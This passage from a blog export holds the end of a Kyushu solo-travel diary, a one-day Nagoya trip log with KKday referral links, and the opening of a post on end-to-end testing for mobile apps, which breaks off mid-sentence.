opened AMU PLAZA KUMAMOTO department store near Kumamoto Station (larger and more diverse than Sakuramachi Shopping Center), as well as the nearby Higo Market (selling food).Still found many Kumamon XD.Had a casual dinner of Miyazaki chicken (ordinary) at the food court. After walking through the entire building, bought some late-night snacks and strawberry wine from Kumamoto (tasted good, planning to bring it back to Taiwan). Returned to the hotel.There is a unique store called ‚ÄúBIWAN ÁæéÁÅ£‚Äù that sells Taiwanese food (I saw Guai Guai snacks XD). I checked and found it is opened by Taiwan Ayuan Soap.https://kumataiwanlife.com/While researching, I found a cool website ‚Äî https://kumataiwanlife.com/ which contains the latest news, events, and trivia about Kumamoto in Chinese (for example: Kumamoto‚Äôs ‚Äúband-aid‚Äù is called ‚ÄúLIBATAPE‚Äù)‚Ä¶ and more.I just found out today that the hotel‚Äôs vending machine sells canned draft cola, which I couldn‚Äôt find at the three major convenience stores. It is a product launched by Suntory and Pepsi, not available in Taiwan. Made using a draft beer method for cola, it has strong carbonation and isn‚Äôt overly sweet like syrup-based sodas. I usually throw away regular cola because it gets too cloying, but I can finish draft cola!After a satisfying meal, went to bed early; ready toËøéÊé• the last day in Kumamoto (excluding the return flight day).Day 9 Wandering Around Kumamoto, ShoppingBy the third day in Kumamoto, it actually gets quite boring. I‚Äôve already visited all the attractions, so I can only try to find some places to explore and buy souvenirs or cosmetics.Originally planned to go to Shimabara City, but the trip was too long (2 hours 45 minutes one way). Plus, the JR Pass had already expired, so buying a long-distance ticket would cost extra, so gave up; Oita and Yufuin were also too far, gave up; Minamiaso Village, too lazy to go, saved for next time; so just wandered around the city and shopped, walking slowly.Kumamoto Inari ShrineEarly in the morning, I arrived at T≈çrimachi-suji again and first visited Kumamoto Inari Shrine, which I missed on the first day.Kato ShrineWalk all the way to Kato Shrine (it‚Äôs quite far, about a 20-minute walk, with uphill paths).You can see the slope turning up ahead leading to Kato Shrine. You can also see the area under repair behind the main keep from the first day, along with many scattered castle walls that need to be restored one by one.Small, and half of it is still under maintenance.There was a small Kumamoto earthquake donation box, so I skipped visiting Kato Shrine and donated to the box instead.You can see Kumamoto Castle from the back here.Return the same way and head to Kumamoto City Hall (14th floor has a free observation deck). The walk to Kato Shrine is quite far, so you can take a bus. I originally planned to visit Kumamoto Art Museum, the Craft Museum, and so on, but they are all closed on Mondays!Kumamoto City HallThe 14th floor of Kumamoto City Hall offers a bird‚Äôs-eye view of the entire city of Kumamoto and Kumamoto Castle.After leaving the City Hall, walk toward the Sakuramachi Shopping Center. You will pass a pedestrian bridge, which is a great spot for photos, especially of the Kumamoto tram.This intersection is Kumamoto Ginza Street. A few days ago, I mentioned that this area also has many free information centers.Sakuramachi Shopping CenterWent shopping at Sakura Town Shopping Center, then had Miyazaki beef again paired with beer from Kumamoto; before leaving, bought a Kumamon daifuku to bring back to Taiwan as a souvenir (so cute).Don QuixoteWalk from the lower arcade to the upper arcade, then back to Tsumachi-suji. Along the way, stop by Don Quijote for shopping (the tax-free counter for this store is on the second floor at checkout).After shopping, I thought I‚Äôd go back to the hotel to rest and drop off my things.A Little EpisodeI met some cute elderly people from Kumamoto on the streetcar. They pointed at the Nissin instant noodles in a duty-free clear bag and said, ‚ÄúSo good, right~‚Äù. I replied, ‚ÄúGood! Good@‚Äù Then I took out a Kumamon daifuku I just bought and said to the grandma, ‚ÄúKawaii~‚Äù. She gave a thumbs-up and said, ‚ÄúKawaii, arigato.‚Äù I then said, ‚ÄúÁßÅ„ÅØÂè∞Êπæ‰∫∫„Åß„Åô‚Äù (I am Taiwanese). The grandma seemed to greet me back (my Japanese is too poor to understand, but I caught something about energy). I responded politely and said goodbye to the elderly couple when I got off.After returning to the hotel and opening the curtains for the first time, the Suizenji river basin is right outside; the view is actually nice, and you can hear insects chirping at night.After a short break, there weren‚Äôt many places to go in the afternoon, so I just randomly picked spots on the map to wander around.Luffy StatueFirst, walk to the front of Kumamoto Prefectural Office and find the Luffy statue.Kenjun ShrineThen take the bus plus walk to Ji√†nj≈´n Shrine; a small shrine, almost no one was there as it was about to close.There is no direct bus here; you need to walk a short distance (about 15 minutes). After leaving the shrine, continue walking towards ‚ÄúKumamoto Zoo‚Äù (about 20‚Äì30 minutes) to find the Chopper statue.Chopper StatueSaw a Sergeant manhole cover on the street (seems like it was from a previous event).Find the Chopper statue at the zoo entrance. Kumamoto Zoo seemed quite boring from previous checks, so I didn‚Äôt plan to go in; by evening, it was already closed.A Little EpisodeAt the zoo entrance, I met a Taiwanese family who wanted to take photos, so I helped them. The next day at the airport, I met them again and took another photo with the airplane. The younger brother called me the ‚Äúphoto brother‚Äù XD.Looking at the map, I walked further to Ezu Lake Park in the Suizenji River basin, which was along the way; I found it was just a riverside park where locals exercise, so I took the bus straight back to the hotel (which was also the bus‚Äôs starting point).Izen RamenWent to an izakaya near Shin-Suizenji Station for dinner.Having a meal with a former colleague from Digital Technology, who later appeared on the Line News cover at Books.com and is also known as the Books.com Goddess, Irene Yu.Being able to have a meal with familiar people in a different place was so touching. After all, I had been isolated for several days (not understanding Japanese and barely speaking). In the end, I even received a souvenir from Beppu üò≠.Ate too fast, only remember the chicken wings were delicious. Also tried horse meat skewers (Kumamoto is famous for horse sashimi, but I didn‚Äôt dare to try). The owner‚Äôs wife was very kind, but the menu was all in Japanese, and the characters were hard to recognize with translation apps, so I could only guess XDAfter dinner, I walked back to the hotel (about 15 minutes). Finally, I strolled through the streets of Kumamoto, stopping at Lawson and FamilyMart to buy ice cream and amazake (I originally thought it was sake, but amazake is not alcohol; it‚Äôs a nourishing summer drink).Also picked up breakfast for tomorrow morning (melon bread + juice). The family mart‚Äôs fruit juice with pulp (melon, strawberry, etc.) is really delicious. I almost always buy it when I see it. It has sweet fruit pulp inside and tastes great.Day 10 Return TripI have been wandering alone in Japan for 10 days and am starting to feel homesick, missing Taiwan‚Äôs food and friends.The only advantage of this hotel is that there is an airport shuttle right across the street.Also faced with an actual delay, Google Maps showed the bus had already passed; fortunately, thanks to the lesson from Nagasaki and the electronic signboard, I patiently waited. After about a 10-minute delay, the bus finally arrived.The driver will help place the luggage in the bus‚Äôs undercarriage luggage area. Just remember to take it when you get off.Encountered a wild Kumamon fence on the road XD Kumamoto really has Kumamon everywhere!Arrived at the airport early around 9 o‚Äôclock (since there was nowhere else to go, coming later would just mean staying at the hotel longer before heading out).Aso Kumamoto Airport (KMJ) is very new and small, with limited flights; today there are only three international flights, and the international section has just three counters, all used in rotation.Check-in and baggage drop open around 10:20. Previously, I flew EVA Air (allowed two carry-ons), but this time with China Airlines, only one carry-on is allowed. I quickly compressed my items into one bag on site.The ground staff said not to leave immediately after checking in the luggage. Wait on-site for about 5 to 10 minutes. If there is any issue with the luggage, they will call your number to handle it (the airport is small and has no electronic display board, so you just have to wait).After clearing security, head towards the international departures area; I originally planned to arrive early to explore the airport, but there wasn‚Äôt much to see there. I was probably really tired at that time. Later, I found out there is actually an observation deck to watch planes. After checking in your luggage, you can take a walk there without rushing to go through immigration. Note that all the food on the 3rd floor is located after the security check and before departure. You can turn left to the dining area, but you must go through security again when returning. Once you have completed departure, there are no food vendors left, only duty-free shops.Almost no one was present all the way to the exit inspection, and you had the security check all to yourself.Since I wasn‚Äôt very hungry, I didn‚Äôt go to eat anywhere and went straight to the international departure lounge.The waiting lounge and duty-free shops are small but new, and both have USB charging outlets; you can see the observation deck mentioned earlier (those people on the 2nd floor are there).I didn‚Äôt buy anything special, just used up the Suica balance on my Apple Watch and bought two bottles of peach water to bring back to Taiwan.12:30 Depart on time, Bye Kyushu, Bye Kumamoto.The return flight was newer, and they had the Super Mario Brothers movie. I finished watching just as we arrived in Taiwan. The seats weren‚Äôt fully occupied, so I had an entire row to myself‚Äîsuper comfortable!When getting off the plane, I noticed the person in front of me was wearing a helmet. Did they ride a scooter to catch the flight? ü§£Arrived at Taoyuan Airport, heading home!When picking up the luggage, it might have been checked in too early; waited a bit before coming. Took the chance to test the Airtag tracking feature, and it alerted when the luggage was nearby!Back in Taiwan, I saw Kumamon on the street again XD (It seems to be a new card campaign by E.SUN Bank).Additional Notes on Riding Buses and Trams in Japan Numbered ticket (with a number) = When boarding, there is a small machine at the door where you can take a ticket (similar to taking a numbered queue ticket). Some routes may not have numbered tickets and use a flat fare. If you use electronic payment (Suica), you don‚Äôt need to take a numbered ticket, but be careful that your balance does not go negative (different from Taiwan). Buses and trams do not give change, but you can first use the coin changer machine on the vehicle (located near the driver‚Äôs payment area). Mostly back boarding, front exiting. Japanese buses wait for passengers, only leaving after everyone is seated or has gotten off; so just stand up when the bus arrives at your stop, no need to push forward before then (different from Taiwan). Get off the bus and check the ticket number in your hand along with the corresponding fare to pay: No worries taking buses in Japan! Complete guide to bus riding rulesThis concludes the entire record and experience of my 10-day solo trip in Kyushu. The summary/retro is written above. Thank you for reading.KKday Promotion Japan JR PASS | Kyushu Area Rail Pass | North Kyushu &amp; South Kyushu &amp; All Kyushu | E-Ticket Japan Nagasaki | Kyushu Huis Ten Bosch Ticket Huis Ten Bosch Japan eSIM CardÔΩúDaily High-Speed, Total Data, Unlimited Data Plans Fukuoka NishitetsuÔΩúDazaifu Tenmangu + Yanagawa Boat Tour Sightseeing PassÔΩúPick up at Fukuoka Airport International Terminal teamLab Forest Fukuoka Tickets ‚Äî SBI SecuritiesÔΩúCheck Now „ÄêSolo Tour„ÄëOne-Day Trip in Kyushu, JapanÔΩúTakachiho Gorge &amp; Amanoiwato Shrine &amp; Amano Yasugawara (Including Special Aso Akaushi Beef BBQ Set)ÔΩúDeparting from Fukuoka One-Day Tour in Kumamoto, KyushuÔΩúAso Nakadake Volcano, Kusasenri, Kumamoto Castle, Suizenji Jojuen Garden / All-You-Can-Eat Seasonal FruitsÔΩúDeparting from Fukuoka Hakata (Chinese, English, Japanese Supported) If this article is helpful to you, please consider using my referral link to purchase KKday products and tours. I will receive a commission to continue creating more travel content. Thank you.[2024 Update] Second Visit to Kyushu Second Visit to Kyushu in June 2024 (9 Days + 2 Days in Korea)Entering Japan Hakata from Busan, Korea by New Camellia Cruise, Touring Yufuin, Oita, Fukuoka, Shimonoseki, Itoshima, SaseboIf you have any questions or feedback, feel free to contact me.More Travelogues Tokyo Area Travel GuideÔΩúKawagoe Little Edo &amp; Atami Fireworks Festival 5-Day Itinerary Busan Travel GuideÔΩú8-Day Itinerary with VISIT BUSAN PASS for Seamless Exploration San‚Äôin &amp; Kansai 7-Day Solo TripÔΩúExplore Izumo, Matsue, Tottori, Himeji, Osaka, Kobe Bangkok Travel GuideÔΩú5-Day Independent Trip Highlights in Thailand Kyushu 9-Day Independent TripÔΩúBusan to Hakata Cruise Entry and Scenic Tours Sanyo Region Travel GuideÔΩú6-Day Hiroshima &amp; Okayama Itinerary for Freedom Seekers Kyushu 10-Day Solo Travel GuideÔΩúExplore Fukuoka, Nagasaki &amp; Kumamoto Efficiently Nagoya One-Day Quick TripÔΩúPeach Aviation Flight Experience and Travel Tips Tokyo 5-Day Travel GuideÔΩúTop Tips for Food, Stay &amp; Transport Kyoto Osaka Kobe 8-Day ItineraryÔΩúFree Travel Guide with Food, Stay &amp; Transit TipsFound this guide useful? Use my KKday referral link to book your trip‚ÄîI‚Äôll earn a small commission to support more content like this. Thank you! üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Nagoya One-Day Quick TripÔΩúPeach Aviation Flight Experience and Travel Tips", "url": "/posts/travel-journals/nagoya-one-day-quick-trip-peach-aviation-flight-experience-and-travel-tips-7b8a0563c157/", "categories": "Travel Journals", "tags": "english, ai-translation, life, japan, nagoya, traveling, peach", "date": "2023-09-29 00:39:58 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 9/11 One-Day Quick Trip to NagoyaPeach Aviation Nagoya One-Day Fl...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 9/11 One-Day Quick Trip to NagoyaPeach Aviation Nagoya One-Day Flash Ticket Trip ExperienceBackgroundOne-day round-trip flight tickets to Nagoya are offered in a promotion by Peach Aviation:At that time, I bought a round-trip ticket to Nagoya for $5,600, including airport service fees, no checked baggage, no meals, no seat selection; both flights were red-eye: Departure: TPE 02:25 -&gt; NGO 06:30 Return: NGO 23:15 -&gt; TPE 01:25 According to the official promotion, maximum stay time is 16 hours and 45 minutes!Carry-on baggage rules: Two pieces per person &amp; total weight under 7 kgCarry-on Baggage RegulationsDate: 2023/09/11, Solo TravelVisit JapanTo speed up entry, you can pre-fill your entry information and complete the process directly using a QR code: The stay duration is set to 1 day. For the contact information in Japan, I directly entered the details of Nagoya Chubu Centrair International Airport. I was not asked any questions and passed security smoothly!Central Japan International Airport InformationKKday Promotion Japan AichiÔΩúYoshitaka Park Ghibli Park Grand Walk Premium Ticket &amp; Nagoya Hotel AccommodationÔΩúGuaranteed Admission Japan JR PASSÔΩúTakayama &amp; Hokuriku Area Tourist PassÔΩúInternational Shipping Available Chubu Centrair International Airport NGO ‚áÜ Nagoya Station | Meitetsu Airport Limited Express Electronic Ticket Japan LEGOLAND TicketsÔΩúNagoya LEGOLAND Summary (Written at the Beginning)A one-day flash trip is a test of physical and mental endurance; I originally planned to sleep while waiting for the flight or on the plane, but the waiting time was too early to feel sleepy. After boarding, the seat was too small, I didn‚Äôt get a window seat, and the engine noise was loud, so I didn‚Äôt really sleep, effectively staying awake all night. After landing at 6:00, I started the Nagoya itinerary; I was so tired that I ended up napping for over half an hour in a quiet, nearly empty caf√© at Nagoya Tower around noon.Time and attractions are limited, so traveling too far is not feasible.Besides the body‚Äôs energy, the phone‚Äôs battery is also a big challenge; I only managed to complete the entire trip with a 20,000mAh Xiaomi power bank (which charged the iPhone 13 about 4‚Äì5 times round trip).Returning to Taiwan around 2‚Äì3 AM, there is no public transportation available, so you can only take a taxi back to Taipei.You can pay a few hundred more to choose a window seat and prepare a neck pillow and earplugs for better sleep.Departure9/10 PM 22:03 ‚Äî Arrived at Taoyuan Airport MRT A1 Taipei Main Station, took the 22:15 express train to Terminal 19/10 PM 10:55 ‚Äî Arrived at Terminal 1 Departure HallArrived too early; the check-in counter opens at 23:55 (although no checked baggage, online check-in was unavailable for some reason, so I still had to wait for the counter to open).There is still one hour before check-in opens, so I decided to go back to the B1 food court to find a seat and rest; at 11 PM, all food court shops are closed (including convenience stores), so you can‚Äôt buy any food.9/11 AM 00:09 ‚Äî Completed Departure ProceduresThe check-in counter opened early. When I returned to the departure hall at 11:40, I saw that check-in had already started. Without checked luggage and only carrying a backpack, I quickly completed check-in, security check, and departure procedures.Starting from 9/11, the official 24-hour countdown begins!9/11 AM 00:12 ‚Äî Wandering around Terminal 1It is worth mentioning that Terminal 1 has a free lounge area open to the public. Just follow the signs to the lounge; the environment and seating are similar to a caf√©. There is also a shower room (open from 6 AM to 10 PM). For detailed information, please refer to this article.The rest area was actually better for sleeping because you could lie down‚Ä¶ But at that time, I just passed by and took a quick look before starting to search the airport for places selling food (since there was no airplane meal). As expected, it was too late and everything was closed. In the end, I only found a vending machine selling snacks, so I bought a pack of I-Mei cream puffs and grabbed a can of tea to take with me.9/11 AM 00:45 ‚Äî Waiting at the boarding gateArrived way too early, so the waiting lounge was almost empty; the seats come in pairs, making it hard to lie down and sleep (they look ugly, I got up right after taking the photo). Sleeping on my back was uncomfortable, and the air conditioning in the lounge was very cold. However, I still felt quite alert and not sleepy at that time. As time passed, more people arrived, and the noise grew louder, making it even harder to sleep. So I just closed my eyes to rest and conserve energy, reviewed some basic Japanese (hiragana and katakana), planning to sleep once on the plane.9/11 AM 02:14 ‚Äî Boarding completedThe flight was slightly delayed. Boarding was originally scheduled to start at 01:55 but was delayed by 10 minutes; I finally completed boarding at 02:15.9/11 AM 02:26 ‚Äî Plane TakeoffThe seat was very small, located by the aisle without a headrest for support. Luckily, I brought a neck pillow which provided some support, but the constant engine noise plus neck soreness meant I hardly slept. The bumpy ride continued all the way to Nagoya. There was no in-flight screen showing flight distance, making the time feel very long. If I had to choose again, I would pay a few hundred more to get a window seat; first, having a place to rest your head makes it easier to sleep, and second, you can see the sunrise from the window when arriving in Japan in the morning!9/11 AM 06:20 ‚Äî Arrive at Nagoya Chubu Centrair International Airport9/11 AM 06:35‚Äî Completed Immigration ClearanceIt was probably early morning and no need to pick up luggage, so it took less than 15 minutes from plane landing to immigration; however, the weather was not favorable, and it was raining heavily in Nagoya.9/11 AM 7:03 ‚Äî Waiting for the train to Nagoya city centerOne shows seat information, and the other is the admission ticket (for machine input). KKday Japan Chubu Centrair International Airport NGO ‚áÜ Nagoya StationÔΩúMeitetsu Airport Express Train E-TicketI first bought a one-way ticket from Chubu Centrair International Airport to Meitetsu Nagoya ($271) online, thinking since I was here, I might as well try the newest and best train; it has reserved seats, is very stable and comfortable, and is a limited express train.However, if you want to save money and be convenient, you can buy a regular express ticket on-site or just board a local train at the station; below is the train schedule and stops, or you can check directly on the Meitetsu website:Destination 1: Konparu Osu „Ç≥„É≥„Éë„É´ Â§ßÈ†àÊú¨Â∫ó Eat fried shrimp toastYou need to get off at Jinshan (NH34) and transfer to Meisei Prefecture to go to Kamimaezu Station.9/11 AM 8:00 Arrive at Konparu Osu „Ç≥„É≥„Éë„É´ Â§ßÈ†àÊú¨Â∫ó8 o‚Äôclock when the door opens, it‚Äôs completely empty early in the morning, and the nearby Osu shopping street is also not open yet.Coffee is a must, especially after staying up all night; the shrimp in the fried shrimp toast is whole, then sliced, so you can taste the springy texture of the shrimp meat.Destination 2: Nagoya CastleNagoya Castle opens at 9:00 AM, while other attractions open later. Since it‚Äôs on the way and very close from Kamimaezu Station, we visit Nagoya Castle first.9/11 AM 9:02 Arrive at Nagoya CastleAfter eating, we set off and arrived at Nagoya Castle Station around 9:02.After leaving the station, I found it was raining heavily. I didn‚Äôt expect rain in Japan and didn‚Äôt bring an umbrella. The area nearby was very open with no convenience stores in sight. Finally, I found a FamilyMart on B1 of the underground street at Nagoya Castle Station, across from Nagoya City Hall. I bought an umbrella and continued to Nagoya Castle!Entering Nagoya Castle, the rain eased slightly, but the main keep was still under renovation and closed. Visitors could only tour the nearby lavish Honmaru Palace.Honmaru PalaceEntering the Honmaru Palace requires removing shoes and storing bags (free, but a 100 yen coin is needed).Destination 2: Chubu Electric Power MIRAI TOWER (formerly Nagoya TV Tower)Just at the lower right corner of Nagoya Castle, about 2 stops away; I took a bus after leaving Nagoya Castle.9/11 AM 10:08 ‚Äî Arrived at Chubu Electric Power MIRAI TOWER (formerly Nagoya TV Tower)The weather was partly cloudy and partly sunny, clearing up when we arrived and becoming cloudy again when we left.After purchasing a ticket, you can go up to the observation deck to overlook Nagoya city (if you only want to visit the caf√© on the middle level, no ticket is needed; the caf√© also offers some views).Cafe view, around 10:30, drowsiness started to hit; I napped here until after 11 before leaving. There are many seats, few people, and it‚Äôs quiet‚Ä¶ perfect for a nap.Destination 3: Oasis 21Oasis 21 is right outside Nagoya Tower, but due to rain, a weekday, and morning hours, there wasn‚Äôt much to explore. We just walked around briefly and then left.Destination 4: Yabaton Yabacho Main StoreIt was almost noon, so I decided to try Nagoya‚Äôs famous miso pork cutlet. The main store is about one or two stops away from Nagoya Tower, so I chose to walk.Destination 5: Osu Shopping StreetWhen I arrived, I found a long queue‚Ä¶ Time was precious, and since it was close to Osu Shopping Street, I decided to keep walking there to find food.9/11 PM 12:09 ‚Äî Arrived at Osu Shopping StreetWalk towards Osu Kannon, and just before reaching Osu Kannon, there is another branch of Shichang. Enter and dine inside.Mindlessly ordered the set meal, but realized I made a mistake. The main goal was to eat the miso pork cutlet in the top left corner. The set includes miso pork cutlet + fried willow leaf fish + simmered dish + side dish + soup + rice. The miso pork cutlet is delicious but too little, not enough to satisfy!Destination 6: Osu KannonThis store is right next to Osu Kannon.9/11 PM 13:05‚Äî Arrived at Osu KannonThe main hall is under maintenance, so we just walked around outside and left.If you are afraid of birds, don‚Äôt come. There are many pigeons outside, and you can buy feed to feed them.Destination 7: Atsuta ShrineStroll through Osu Shopping Street once more, then head back to the Meijo Line to go to Atsuta Shrine.Bought Benten Fruit Daifuku on the street. The skin is thin and tender, the fruit is fresh and juicy. I ate two at once! (I think it tastes better than Rushuian XD)Then I went to the shopping street‚Äôs drugstore to quickly buy some medicines that can be taken on the plane back to Taiwan.9/11 PM 13:35 ‚Äî Arrived at Atsuta ShrineAfter exiting Meijo Line Atsuta Jingu Station, you still need to walk a bit to reach the main entrance of Atsuta Shrine.After a simple visit, I bought some omamori and left.Destination 8: Meitetsu Nagoya ShoppingThe last point is to visit Meitetsu (actually, by the time you get here, you‚Äôre already quite tired).9/11 PM 14:40 ‚Äî Arrived at Meitetsu NagoyaAfter walking around the underground shopping street, head to JR GATE TOWER and go up to the Starbucks on the 15th floor, where you can enjoy free views.Because it was raining, the outdoor seats were closed, and the indoor seats were full, so I didn‚Äôt buy a coffee to sit and enjoy the view; after taking a few photos, I started walking down to Takashimaya Department Store. There is a Harbs on the lower floor, but it requires waiting in line.There is a Sky Promenade across the street, a new observation deck in Nagoya, but we didn‚Äôt go because we were tired, had to buy another ticket, and the weather was bad. There were no other attractions of interest open within the time we had left. In the end, we just walked down to the underground shopping street and bought some souvenirs (Kaeru Honke). Then we bought a one-way ticket from Nagoya Railroad to Chubu Centrair International Airport plus the uSky train ($271) back to the airport.It‚Äôs not yet 5:00 PM, which is a bit of a pity‚Ä¶ but going to other attractions is too far‚Ä¶ I also want to avoid the rush hour crowd.Destination 9: Wandering Around Nagoya Chubu Centrair International AirportTook a quick shot of the real uSky.9/11 PM 16:44 ‚Äî Arrived at Central Japan International Airport Terminal 123:15 The plane just took off, and there is still a long, long time ahead.First, buy Nagoya‚Äôs famous tebasaki to try.NGO Airport has many things to explore. Besides food, drinks, and souvenirs, there is a large observation deck where you can watch planes take off and land up close! (Terminal 1)Or first go to Terminal 2 to see the free airplane museum (it was already closed when I visited).There is also a Lawson and a capsule toy store here (but they also have business hours).9/11 PM 19:30 ‚Äî Chubu Centrair International Airport Terminal 1 DinnerFor dinner, I had Nagoya Udon at the airport. Nagoya‚Äôs specialty noodles are flat.The taste is good, but I accidentally ordered two main dishes‚Ä¶ His pork cutlet is served as a pork cutlet rice XDAfter eating, continue waiting at the gate‚Ä¶ waiting for the check-in counter to open (opens at 20:45).9/11 PM 20:45 ‚Äî Central Japan International Airport Terminal 1 Departure ProceduresNapped in the corner for a bit, then went to line up for departure around 8 PM; United Airlines is quite strict with carry-on luggage checks, enforcing the rule of two items under 7 kg each without exceptions. I also saw someone who was just there to buy a PS5 and bring it back‚Äîseems like a good choice for a one-day quick trip.9/11 PM 21:45 ‚Äî Central Japan International Airport Terminal 1 Shopping Duty-Free Stores, Waiting for FlightI only have one bag, so I can carry one more by hand. I conveniently bought a bottle of Dassai 23 750 ml before returning to Taiwan. (5,700 yen, 100 yen more expensive than in Tokyo)Draft Coke tastes good. You can buy it at supermarkets or vending machines to try. It is launched by Suntory and Pepsi together and is not available in Taiwan. It uses the brewing method of draft beer to make cola, giving it a strong carbonation and less syrupy sweetness. I usually pour out regular cola because it gets too sweet toward the end, but I can finish draft Coke! Back to the strict carry-on luggage check at United Airlines, they will recheck before boarding to ensure you only have two items. If not, you will have to reduce to two items on the spot or pay an extra fee.9/12 AM 00:09 ‚Äî Depart from Central Japan International Airport Terminal 1Due to a flight delay, the original departure time of 23:15 was postponed to 23:50; the flight took off around 00:15.But luckily, I got a window seat, so I can get some good sleep.After waking up and researching the onboard facilities, I found that flight information and entertainment videos can be accessed through the onboard WiFi using your phone. You can also order food directly via your phone.Someone ordered something like pork rib chicken noodles, and the whole cabin was filled with the aroma. It was quite tempting.9/12 AM 02:25 ‚Äî Arrive at Taoyuan International AirportLuckily, I was seated by the window and managed to catch some sleep on the plane; my energy is still okay.9/12 AM 03:30 Arrive at the warm Taipei accommodationI have to say, transportation in Taiwan is very inconvenient. With red-eye flights arriving at Taoyuan Airport, you can only take the dreaded flat-rate taxi or an expensive Uber back to Taipei. If you want to use public transport, you have to wait for the bus at 4‚Äì5 AM.Purpose of this line: To collect Nagoya Castle, one of the three famous castles:Later, I found out that Nagoya also has Inuyama Castle worth visiting. If I were to plan again, I‚Äôd probably visit Inuyama Castle first. Also, I didn‚Äôt get to try the eel rice!KKday Promotion Japan AichiÔΩúYoshitaka Park Ghibli Park Grand Walk Premium Ticket &amp; Nagoya Hotel AccommodationÔΩúGuaranteed Admission Japan JR PASSÔΩúTakayama &amp; Hokuriku Area Tourist PassÔΩúInternational Shipping Available Chubu Centrair International Airport NGO ‚áÜ Nagoya Station | Meitetsu Airport Limited Express Electronic Ticket Japan LEGOLAND TicketsÔΩúNagoya LEGOLAND If this article is helpful to you, please consider using my referral link to purchase KKday products and tours. I will receive a commission to continue creating more travel content. Thank you.If you have any questions or suggestions, feel free to contact me.More Travelogues Tokyo Area Travel GuideÔΩúKawagoe Little Edo &amp; Atami Fireworks Festival 5-Day Itinerary Busan Travel GuideÔΩú8-Day Itinerary with VISIT BUSAN PASS for Seamless Exploration San‚Äôin &amp; Kansai 7-Day Solo TripÔΩúExplore Izumo, Matsue, Tottori, Himeji, Osaka, Kobe Bangkok Travel GuideÔΩú5-Day Independent Trip Highlights in Thailand Kyushu 9-Day Independent TripÔΩúBusan to Hakata Cruise Entry and Scenic Tours Sanyo Region Travel GuideÔΩú6-Day Hiroshima &amp; Okayama Itinerary for Freedom Seekers Kyushu 10-Day Solo Travel GuideÔΩúExplore Fukuoka, Nagasaki &amp; Kumamoto Efficiently Nagoya One-Day Quick TripÔΩúPeach Aviation Flight Experience and Travel Tips Tokyo 5-Day Travel GuideÔΩúTop Tips for Food, Stay &amp; Transport Kyoto Osaka Kobe 8-Day ItineraryÔΩúFree Travel Guide with Food, Stay &amp; Transit TipsFound this guide useful? Use my KKday referral link to book your trip‚ÄîI‚Äôll earn a small commission to support more content like this. Thank you! üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "POC App E2E TestingÔΩúLocal Snapshot API Mock Server for Reliable Validation", "url": "/posts/zrealm-dev/poc-app-e2e-testing-local-snapshot-api-mock-server-for-reliable-validation-5a5c4b25a83d/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, end-to-end-testing, ui-testing, automation-testing, ios", "date": "2023-08-28 22:53:27 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![POC] App End-to-End Testing Local Snapshot API Mock ServerFeasibility Verific...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![POC] App End-to-End Testing Local Snapshot API Mock ServerFeasibility Verification of Implementing E2E Testing for Existing Apps and API ArchitecturesPhoto by freestocksIntroductionAs a project that has been running online for many years, continuously improving stability is a highly challenging issue.Unit TestingBecause the app is developed in Swift/Kotlin with static typing, compilation, and strong typing, or converted from Objective-C to Swift (dynamic to static), if interface dependencies are not properly separated during development, adding Unit Testing later is almost impossible; however, refactoring can introduce instability, creating a chicken-and-egg problem.UI TestingFor UI interactions and button testing; slight decoupling of data dependencies in new or existing screens can achieve this.SnapShot TestingVerify whether the UI display content and style are consistent before and after adjustments; similar to UI Testing, newly developed or existing screens can achieve this by slightly decoupling data dependencies.Useful for converting Storyboard/XIB layouts or UIViews from Objective-C to Swift; you can directly import pointfreeco / swift-snapshot-testing for quick implementation.Although we can add UI Testing and Snapshot Testing later, the coverage is very limited; most errors are not related to UI styles but to process or logic issues that cause users to stop their actions. If these occur in the checkout process, affecting revenue, the problem becomes very serious.End-to-End TestingAs mentioned earlier, it is not feasible to simply add unit tests to the current project or consolidate units for integration testing. For protecting logic and processes, the remaining method is to perform End-to-End black-box testing externally, directly from the user‚Äôs perspective, to verify whether key workflows (registration/checkout‚Ä¶) function correctly. For major feature refactoring, first create tests for the workflow before refactoring, then re-validate after refactoring to ensure the feature works as expected. During refactoring, add Unit Testing and Integration Testing to improve stability and resolve the chicken-and-egg problem.QA TeamThe most straightforward and brute-force method for End-to-End Testing is to have a QA team manually test according to the Test Plan, then continuously optimize or introduce automation; calculating the cost, it requires at least 2 engineers plus 1 leader spending at least six months to a year to see results.Evaluate the time and cost. Is there anything we can do now or prepare for the future QA Team so that when the QA Team is established, they can directly move to optimization, automation, or even AI implementation(?).AutomationAt this stage, the goal is to implement automated End-to-End Testing within the CI/CD pipeline. The test coverage doesn‚Äôt need to be complete; as long as it can prevent major process issues, it is already valuable. The Test Plan can be gradually iterated and expanded later to cover more 